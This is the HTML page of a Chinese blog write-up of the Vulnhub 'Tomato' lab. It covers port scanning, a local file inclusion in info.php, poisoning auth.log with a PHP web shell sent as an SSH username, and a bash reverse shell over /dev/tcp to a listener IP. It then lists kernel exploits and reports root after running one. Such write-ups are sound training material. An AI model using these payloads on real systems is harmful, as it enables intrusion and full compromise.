@@ -1,0 +1,624 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>Vulnhub Tomato - Josephine&#39;s Blog</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="Josephine" /><meta name="description" content="枚举 确定 IP 地址 使用 nmap 进行探活： 1 2 3 4 nmap -sn 10.1.1.0/24 Nmap scan report for 10.1.1.69 Host is up (0.00089s latency). 机器 IP 为 10.1.1.69。 端口扫描及服务枚举 进行全 TCP 端口扫描，同时枚举服务" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.80.0 with theme even" />
+
+
+<link rel="canonical" href="https://bulletforkiller.github.io/post/vulnhub-tomato/" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+<link href="/sass/main.min.2e81bbed97b8b282c1aeb57488cc71c8d8c8ec559f3931531bd396bf31e0d4dd.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
+
+
+<meta property="og:title" content="Vulnhub Tomato" />
+<meta property="og:description" content="枚举 确定 IP 地址 使用 nmap 进行探活： 1 2 3 4 nmap -sn 10.1.1.0/24 Nmap scan report for 10.1.1.69 Host is up (0.00089s latency). 机器 IP 为 10.1.1.69。 端口扫描及服务枚举 进行全 TCP 端口扫描，同时枚举服务" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://bulletforkiller.github.io/post/vulnhub-tomato/" />
+<meta property="article:published_time" content="2021-06-24T06:51:36+08:00" />
+<meta property="article:modified_time" content="2021-06-24T06:51:36+08:00" />
+<meta itemprop="name" content="Vulnhub Tomato">
+<meta itemprop="description" content="枚举 确定 IP 地址 使用 nmap 进行探活： 1 2 3 4 nmap -sn 10.1.1.0/24 Nmap scan report for 10.1.1.69 Host is up (0.00089s latency). 机器 IP 为 10.1.1.69。 端口扫描及服务枚举 进行全 TCP 端口扫描，同时枚举服务">
+<meta itemprop="datePublished" content="2021-06-24T06:51:36+08:00" />
+<meta itemprop="dateModified" content="2021-06-24T06:51:36+08:00" />
+<meta itemprop="wordCount" content="1340">
+
+
+
+<meta itemprop="keywords" content="Vulnhub," />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Vulnhub Tomato"/>
+<meta name="twitter:description" content="枚举 确定 IP 地址 使用 nmap 进行探活： 1 2 3 4 nmap -sn 10.1.1.0/24 Nmap scan report for 10.1.1.69 Host is up (0.00089s latency). 机器 IP 为 10.1.1.69。 端口扫描及服务枚举 进行全 TCP 端口扫描，同时枚举服务"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Josephine&#39;s Blog</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="/">
+        <li class="mobile-menu-item">Home</li>
+      </a><a href="/post/">
+        <li class="mobile-menu-item">Archives</li>
+      </a><a href="/tags/">
+        <li class="mobile-menu-item">Tags</li>
+      </a><a href="/categories/">
+        <li class="mobile-menu-item">Categories</li>
+      </a><a href="/about/">
+        <li class="mobile-menu-item">About</li>
+      </a>
+  </ul>
+
+  
+
+
+</nav>
+
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="/" class="logo">Josephine&#39;s Blog</a>
+</div>
+
+
+
+
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="/">Home</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/post/">Archives</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/tags/">Tags</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/categories/">Categories</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/about/">About</a>
+      </li>
+  </ul>
+</nav>
+
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">Vulnhub Tomato</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2021-06-24 </span>
+        <div class="post-category">
+            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"> 渗透测试 </a>
+            </div>
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content always-active">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#枚举">枚举</a>
+      <ul>
+        <li><a href="#确定-ip-地址">确定 IP 地址</a></li>
+        <li><a href="#端口扫描及服务枚举">端口扫描及服务枚举</a></li>
+        <li><a href="#21-端口枚举">21 端口枚举</a></li>
+        <li><a href="#80-端口枚举">80 端口枚举</a></li>
+        <li><a href="#8888-端口">8888 端口</a></li>
+      </ul>
+    </li>
+    <li><a href="#initial-shell">Initial Shell</a></li>
+    <li><a href="#提权">提权</a></li>
+  </ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      <h1 id="枚举">枚举</h1>
+<h2 id="确定-ip-地址">确定 IP 地址</h2>
+<p>使用 nmap 进行探活：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">nmap -sn 10.1.1.0/24
+
+Nmap scan report <span class="k">for</span> 10.1.1.69
+Host is up <span class="o">(</span>0.00089s latency<span class="o">)</span>.</code></pre></td></tr></table>
+</div>
+</div>
+<p>机器 IP 为 <strong>10.1.1.69</strong>。</p>
+<h2 id="端口扫描及服务枚举">端口扫描及服务枚举</h2>
+<p>进行全 TCP 端口扫描，同时枚举服务和操作系统的信息：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">nmap -vv --reason -Pn -A --osscan-guess --version-all -p- -oN 10.1.1.69
+
+PORT     STATE SERVICE REASON         VERSION
+21/tcp   open  ftp     syn-ack ttl <span class="m">63</span> vsftpd 3.0.3
+80/tcp   open  http    syn-ack ttl <span class="m">63</span> Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+<span class="p">|</span> http-methods: 
+<span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
+<span class="p">|</span>_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+<span class="p">|</span>_http-title: Tomato
+2211/tcp open  ssh     syn-ack ttl <span class="m">63</span> OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+<span class="p">|</span> ssh-hostkey: 
+<span class="p">|</span>   <span class="m">2048</span> d2:53:0a:91:8c:f1:a6:10:11:0d:9e:0f:22:f8:49:8e <span class="o">(</span>RSA<span class="o">)</span>
+<span class="p">|</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDWlaPDFzZw57482HON5cSi7r32bM0suv/W/UDSY5vhwZVUE3f2uWmYsxXWrZTDRjKkzEay90N+X7d22SOGuMLhUNSowjsciLzEwymx2pnj3brhQvXOmzMNl9+QmJl0nJ2OrIJ946Rz1zTTh208gj0tFKK8PmAtrHVKithkKDFiW3yt9IM41X/ECjn7rG3rFsz3IB0x5vMEpkFennAfLL3odCCeb49wDXOpmZ9tiadpBmqKdgQr3NSRZ82lTgLGism9iWK5gUDdw/2PCBYQcL8eYRJxkYKhqcGJ4h8ieMjn0L+EpEleA3y7qQtClhZ9LFeaKhOoUe6fjFszqBZwMCqp
+<span class="p">|</span>   <span class="m">256</span> b3:12:60:32:48:28:eb:ac:80🇩🇪17:d7:96:77:6e:2f <span class="o">(</span>ECDSA<span class="o">)</span>
+<span class="p">|</span> ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPTQBx5f7oumXmo4oI/1UcCQcbsuDeltX8HhjGszH52b43ALRnIolE7tp2lL3RRcDPYFCP6TYiFTiI5BTItFxjM<span class="o">=</span>
+<span class="p">|</span>   <span class="m">256</span> 36:6f:52:ad:fe:f7:92:3e:a2:51:0f:73:06:8d:80:13 <span class="o">(</span>ED25519<span class="o">)</span>
+<span class="p">|</span>_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIO+ijwjZgKJrKtJ1LCS0tHecORlikMHQY36bDmZ7fX9Y
+8888/tcp open  http    syn-ack ttl <span class="m">63</span> nginx 1.10.3 <span class="o">(</span>Ubuntu<span class="o">)</span>
+<span class="p">|</span> http-auth: 
+<span class="p">|</span> HTTP/1.1 <span class="m">401</span> Unauthorized<span class="se">\x</span>0D
+<span class="p">|</span>_  Basic <span class="nv">realm</span><span class="o">=</span>Private Property
+<span class="p">|</span>_http-server-header: nginx/1.10.3 <span class="o">(</span>Ubuntu<span class="o">)</span>
+<span class="p">|</span>_http-title: <span class="m">401</span> Authorization Required
+Device type: general purpose
+Running: Linux 3.X<span class="p">|</span>4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.11 - 4.1</code></pre></td></tr></table>
+</div>
+</div>
+<p>仅仅开放了三个端口———— 21、80、2211 和 8888，分别运行着 ftp、apache、openssh 和 nginx。</p>
+<p>20 个常用 UDP 端口扫描:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">nmap -vv --reason -Pn -sU -A --top-ports<span class="o">=</span><span class="m">20</span> --version-all
+
+PORT      STATE         SERVICE      REASON              VERSION
+53/udp    closed        domain       port-unreach ttl <span class="m">63</span>
+67/udp    closed        dhcps        port-unreach ttl <span class="m">63</span>
+68/udp    open<span class="p">|</span>filtered dhcpc        no-response
+69/udp    open<span class="p">|</span>filtered tftp         no-response
+123/udp   open<span class="p">|</span>filtered ntp          no-response
+135/udp   closed        msrpc        port-unreach ttl <span class="m">63</span>
+137/udp   closed        netbios-ns   port-unreach ttl <span class="m">63</span>
+138/udp   closed        netbios-dgm  port-unreach ttl <span class="m">63</span>
+139/udp   open<span class="p">|</span>filtered netbios-ssn  no-response
+161/udp   closed        snmp         port-unreach ttl <span class="m">63</span>
+162/udp   closed        snmptrap     port-unreach ttl <span class="m">63</span>
+445/udp   closed        microsoft-ds port-unreach ttl <span class="m">63</span>
+500/udp   open<span class="p">|</span>filtered isakmp       no-response
+514/udp   closed        syslog       port-unreach ttl <span class="m">63</span>
+520/udp   closed        route        port-unreach ttl <span class="m">63</span>
+631/udp   closed        ipp          port-unreach ttl <span class="m">63</span>
+1434/udp  open<span class="p">|</span>filtered ms-sql-m     no-response
+1900/udp  closed        upnp         port-unreach ttl <span class="m">63</span>
+4500/udp  open<span class="p">|</span>filtered nat-t-ike    no-response
+49152/udp closed        unknown      port-unreach ttl <span class="m">63</span></code></pre></td></tr></table>
+</div>
+</div>
+<h2 id="21-端口枚举">21 端口枚举</h2>
+<p>并不能 anonymous 登录，除此之外再无发现。</p>
+<h2 id="80-端口枚举">80 端口枚举</h2>
+<p>主页仅仅为一张图片,图片并未发现异常:</p>
+<p><img src="/images/2021-06-28/tomato.webp" alt="tomato"></p>
+<p>使用 dirb 进行目录扫描:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">dirb http://10.1.1.69
+
+---- Scanning URL: http://10.1.1.69/ ----
+<span class="o">==</span>&gt; DIRECTORY: http://10.1.1.69/antibot_image/
++ http://10.1.1.69/index.html <span class="o">(</span>CODE:200<span class="p">|</span>SIZE:652<span class="o">)</span>
++ http://10.1.1.69/server-status <span class="o">(</span>CODE:403<span class="p">|</span>SIZE:274<span class="o">)</span>
+
+---- Entering directory: http://10.1.1.69/antibot_image/ ----</code></pre></td></tr></table>
+</div>
+</div>
+<p>发现可读目录 /antibot_image：</p>
+<p><img src="/images/2021-06-28/antibots.webp" alt="antibots"></p>
+<p>其中的 info.php 中 有一句 include，怀疑可包含本地文件：</p>
+<p><img src="/images/2021-06-28/info.webp" alt="info"></p>
+<p>读取 /etc/passwd，但并不能 RFI：</p>
+<p><img src="/images/2021-06-28/passwd.webp" alt="passwd"></p>
+<h2 id="8888-端口">8888 端口</h2>
+<p>需要认证，并不知道密码：</p>
+<p><img src="/images/2021-06-28/8888.webp" alt="8888"></p>
+<h1 id="initial-shell">Initial Shell</h1>
+<p>尝试通过日志投毒利用 LFI 来 get shell。经过尝试，发现 /var/log/auth.log 可以读取：</p>
+<p><img src="/images/2021-06-28/auth_log.webp" alt="auth_log"></p>
+<p>SSH 登录使用一句话作为用户名，投毒日志：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">ssh <span class="s1">&#39;&lt;?php system($_GET[&#34;cmd&#34;]); ?&gt;&#39;</span>@10.1.1.69</code></pre></td></tr></table>
+</div>
+</div>
+<p>尝试执行 id 命令，成功：</p>
+<p><img src="/images/2021-06-28/id.webp" alt="id"></p>
+<p>运行 bash reverse payload，成功反弹 shell：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">http://10.1.1.69/antibot_image/antibots/info.php?image<span class="o">=</span>/var/log/auth.log<span class="p">&amp;</span><span class="nv">cmd</span><span class="o">=</span><span class="nb">exec</span> bash -c <span class="s2">&#34;bash -i &gt;/dev/tcp/192.168.17.48/8080 0&gt;&amp;1&#34;</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><img src="/images/2021-06-28/rev.webp" alt="rev"></p>
+<p>获取到 Initial Shell。</p>
+<h1 id="提权">提权</h1>
+<p>使用 linpeas 进行枚举，发现了 nginx 的 hash，经过简单的破解并无结果，转而转向内核：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">[+] Operative system
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits
+Linux version 4.4.0-21-generic (buildd@lgw01-21) (gcc version 5.3.1 20160413 (Ubuntu 5.3.1-14ubuntu2) ) #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016
+Distributor ID: Ubuntu
+Description:    Ubuntu 16.04 LTS
+Release:        16.04
+Codename:       xenial
+</code></pre></td></tr></table>
+</div>
+</div><p>搜索 exploit：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">Exploit Title</th>
+<th style="text-align:left">Path</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">Linux Kernel (Solaris 10 / &lt; 5.10 138888-01) - Local Privilege Escalation</td>
+<td style="text-align:left">solaris/local/15962.c</td>
+</tr>
+<tr>
+<td style="text-align:left">Linux Kernel 2.4.4 &lt; 2.4.37.4 / 2.6.0 &lt; 2.6.30.4 - &lsquo;Sendpage&rsquo; Local Privilege Escalation (Metasploit)</td>
+<td style="text-align:left">linux/local/19933.rb</td>
+</tr>
+<tr>
+<td style="text-align:left">Linux Kernel 2.4/2.6 (RedHat Linux 9 / Fedora Core 4 &lt; 11 / Whitebox 4 / CentOS 4) - &lsquo;sock_sendpage()&rsquo; Ring0 Privilege Escalation (5)</td>
+<td style="text-align:left">linux/local/9479.c</td>
+</tr>
+<tr>
+<td style="text-align:left">Linux Kernel 2.6 &lt; 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora Core 4/5/6 x86) - &lsquo;ip_append_data()&rsquo; Ring0 Privilege Escalation (1)</td>
+<td style="text-align:left">linux_x86/local/9542.c</td>
+</tr>
+<tr>
+<td style="text-align:left">Linux Kernel 3.10/3.18 /4.4 - Netfilter IPT_SO_SET_REPLACE Memory Corruption</td>
+<td style="text-align:left">linux/dos/39545.txt</td>
+</tr>
+<tr>
+<td style="text-align:left">Linux Kernel 3.11 &lt; 4.8 0 - &lsquo;SO_SNDBUFFORCE&rsquo; / &lsquo;SO_RCVBUFFORCE&rsquo; Local Privilege Escalation</td>
+<td style="text-align:left">linux/local/41995.c</td>
+</tr>
+<tr>
+<td style="text-align:left">Linux Kernel 4.10.5 / &lt; 4.14.3 (Ubuntu) - DCCP Socket Use-After-Free</td>
+<td style="text-align:left">linux/dos/43234.c</td>
+</tr>
+<tr>
+<td style="text-align:left">Linux Kernel 4.4 (Ubuntu 16.04) - &lsquo;BPF&rsquo; Local Privilege Escalation (Metasploit)</td>
+<td style="text-align:left">linux/local/40759.rb</td>
+</tr>
+<tr>
+<td style="text-align:left">Linux Kernel 4.4 (Ubuntu 16.04) - &lsquo;snd_timer_user_ccallback()&rsquo; Kernel Pointer Leak</td>
+<td style="text-align:left">linux/dos/46529.c</td>
+</tr>
+<tr>
+<td style="text-align:left">Linux Kernel 4.4 - &lsquo;rtnetlink&rsquo; Stack Memory Disclosure</td>
+<td style="text-align:left">linux/local/46006.c</td>
+</tr>
+<tr>
+<td style="text-align:left">Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - &lsquo;AF_PACKET&rsquo; Race Condition Privilege Escalation</td>
+<td style="text-align:left">linux_x86-64/local/40871.c</td>
+</tr>
+<tr>
+<td style="text-align:left">Linux Kernel 4.4.0 (Ubuntu) - DCCP Double-Free (PoC)</td>
+<td style="text-align:left">linux/dos/41457.c</td>
+</tr>
+<tr>
+<td style="text-align:left">Linux Kernel 4.4.0 (Ubuntu) - DCCP Double-Free Privilege Escalation</td>
+<td style="text-align:left">linux/local/41458.c</td>
+</tr>
+<tr>
+<td style="text-align:left">Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter &lsquo;target_offset&rsquo; Out-of-Bounds Privilege Escalation</td>
+<td style="text-align:left">linux_x86-64/local/40049.c</td>
+</tr>
+<tr>
+<td style="text-align:left">Linux Kernel 4.4.0-21 &lt; 4.4.0-51 (Ubuntu 14.04/16.04 x64) - &lsquo;AF_PACKET&rsquo; Race Condition Privilege Escalation</td>
+<td style="text-align:left">windows_x86-64/local/47170.c</td>
+</tr>
+<tr>
+<td style="text-align:left">Linux Kernel 4.4.1 - REFCOUNT Overflow Use-After-Free in Keyrings Local Privilege Escalation (1)</td>
+<td style="text-align:left">linux/local/39277.c</td>
+</tr>
+<tr>
+<td style="text-align:left">Linux Kernel 4.4.1 - REFCOUNT Overflow Use-After-Free in Keyrings Local Privilege Escalation (2)</td>
+<td style="text-align:left">linux/local/40003.c</td>
+</tr>
+<tr>
+<td style="text-align:left">Linux Kernel 4.4.x (Ubuntu 16.04) - &lsquo;double-fdput()&rsquo; bpf(BPF_PROG_LOAD) Privilege Escalation</td>
+<td style="text-align:left">linux/local/39772.txt</td>
+</tr>
+<tr>
+<td style="text-align:left">Linux Kernel 4.8.0 UDEV &lt; 232 - Local Privilege Escalation</td>
+<td style="text-align:left">linux/local/41886.c</td>
+</tr>
+<tr>
+<td style="text-align:left">Linux Kernel &lt; 3.4.5 (Android 4.2.2/4.4 ARM) - Local Privilege Escalation</td>
+<td style="text-align:left">arm/local/31574.c</td>
+</tr>
+<tr>
+<td style="text-align:left">Linux Kernel &lt; 4.10.13 - &lsquo;keyctl_set_reqkey_keyring&rsquo; Local Denial of Service</td>
+<td style="text-align:left">linux/dos/42136.c</td>
+</tr>
+<tr>
+<td style="text-align:left">Linux kernel &lt; 4.10.15 - Race Condition Privilege Escalation</td>
+<td style="text-align:left">linux/local/43345.c</td>
+</tr>
+<tr>
+<td style="text-align:left">Linux Kernel &lt; 4.11.8 - &lsquo;mq_notify: double sock_put()&rsquo; Local Privilege Escalation</td>
+<td style="text-align:left">linux/local/45553.c</td>
+</tr>
+<tr>
+<td style="text-align:left">Linux Kernel &lt; 4.13.1 - BlueTooth Buffer Overflow (PoC)</td>
+<td style="text-align:left">linux/dos/42762.txt</td>
+</tr>
+<tr>
+<td style="text-align:left">Linux Kernel &lt; 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation</td>
+<td style="text-align:left">linux/local/45010.c</td>
+</tr>
+<tr>
+<td style="text-align:left">Linux Kernel &lt; 4.14.rc3 - Local Denial of Service</td>
+<td style="text-align:left">linux/dos/42932.c</td>
+</tr>
+<tr>
+<td style="text-align:left">Linux Kernel &lt; 4.15.4 - &lsquo;show_floppy&rsquo; KASLR Address Leak</td>
+<td style="text-align:left">linux/local/44325.c</td>
+</tr>
+<tr>
+<td style="text-align:left">Linux Kernel &lt; 4.16.11 - &lsquo;ext4_read_inline_data()&rsquo; Memory Corruption</td>
+<td style="text-align:left">linux/dos/44832.txt</td>
+</tr>
+<tr>
+<td style="text-align:left">Linux Kernel &lt; 4.17-rc1 - &lsquo;AF_LLC&rsquo; Double Free</td>
+<td style="text-align:left">linux/dos/44579.c</td>
+</tr>
+<tr>
+<td style="text-align:left">Linux Kernel &lt; 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation</td>
+<td style="text-align:left">linux/local/44298.c</td>
+</tr>
+<tr>
+<td style="text-align:left">Linux Kernel &lt; 4.4.0-21 (Ubuntu 16.04 x64) - &lsquo;netfilter target_offset&rsquo; Local Privilege Escalation</td>
+<td style="text-align:left">linux_x86-64/local/44300.c</td>
+</tr>
+<tr>
+<td style="text-align:left">Linux Kernel &lt; 4.4.0-83 / &lt; 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP)</td>
+<td style="text-align:left">linux/local/43418.c</td>
+</tr>
+<tr>
+<td style="text-align:left">Linux Kernel &lt; 4.4.0/ &lt; 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privilege Escalation (KASLR / SMEP)</td>
+<td style="text-align:left">linux/local/47169.c</td>
+</tr>
+<tr>
+<td style="text-align:left">Linux Kernel &lt; 4.5.1 - Off-By-One (PoC)</td>
+<td style="text-align:left">linux/dos/44301.c</td>
+</tr>
+</tbody>
+</table>
+<p>机器上没有 gcc，只能将编译后的 exploit 上传至机器，经过一番尝试最终选择 45010。运行，获得 root 权限：</p>
+<p><img src="/images/2021-06-28/root.webp" alt="root"></p>
+
+    </div>
+
+    <div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">文章作者</span>
+    <span class="item-content">Josephine</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">上次更新</span>
+    <span class="item-content">
+        2021-06-24
+        
+    </span>
+  </p>
+  
+  
+</div>
+<footer class="post-footer">
+      <div class="post-tags">
+          <a href="/tags/vulnhub/">Vulnhub</a>
+          </div>
+      <nav class="post-nav">
+        
+        <a class="next" href="/post/vulnhub-devguru/">
+            <span class="next-text nav-default">Vulnhub Devguru</span>
+            <span class="next-text nav-mobile">下一篇</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+  <a href="https://bulletforkiller.github.io/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    由 <a class="hexo-link" href="https://gohugo.io">Hugo</a> 强力驱动
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    主题 - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  
+
+  <span class="copyright-year">
+    &copy; 
+    2020 - 
+    2021<span class="heart"><i class="iconfont icon-heart"></i></span><span>Josephine</span>
+  </span>
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
+
+
+
+<script type="text/javascript" src="/js/main.min.c12618f9a600c40bd024996677e951e64d3487006775aeb22e200c990006c5c7.js"></script>
+
+
+
+
+
+
+
+
+</body>
+</html>
